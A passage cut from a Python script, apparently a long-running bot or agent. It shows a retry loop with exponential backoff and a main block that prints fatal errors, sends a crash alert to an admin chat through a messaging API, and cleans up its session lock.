        except Exception as e:
            time.sleep(backoff)
            backoff = min(backoff * 2, 30)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print("[FATAL] " + str(e))
        print(traceback.format_exc())
        try:
            _req.post(f"{API}/sendMessage",
                     json={"chat_id": ADMIN_CHAT_ID,
                           "text": "💀 [" + SESSION_NAME + "] Agent crash: " + str(e)[:200]},
                     timeout=10)
        except:
            pass
    finally:
        release_local_mutex()
        try:
            unregister_session()
        except:
            pass
